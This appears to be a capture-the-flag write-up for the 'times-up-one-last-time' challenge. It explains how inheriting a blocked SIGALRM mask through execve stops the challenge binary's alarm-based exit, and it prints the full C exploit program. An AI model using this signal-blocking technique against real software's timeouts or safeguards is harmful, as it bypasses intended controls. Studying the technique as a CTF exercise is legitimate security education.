# times-up-one-last-time - Points: 500

This one was fun. Since I had already used this technique on the previous 'times-up' challenges, it applied to this one as well.

## Summary:
Since the alarm signal is used to trigger the exit condition, I created a quick C application that would block the signal, and then execve the vulnerable application. Child processes inhert from parent processes, so this causes the ALARM to never fire. 

## Exploit:
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

main() {
  signal(SIGINT, SIG_IGN);
  signal(SIGALRM, SIG_IGN);

  sigset_t mask, oldmask;

  /* Set up the mask of signals to temporarily block. */
  sigemptyset (&mask);
  sigaddset (&mask, SIGALRM);

  /* Wait for a signal to arrive. */
  sigprocmask (SIG_BLOCK, &mask, &oldmask);

  execve("./times-up-one-last-time",NULL,NULL);
  printf("Error");
}
```

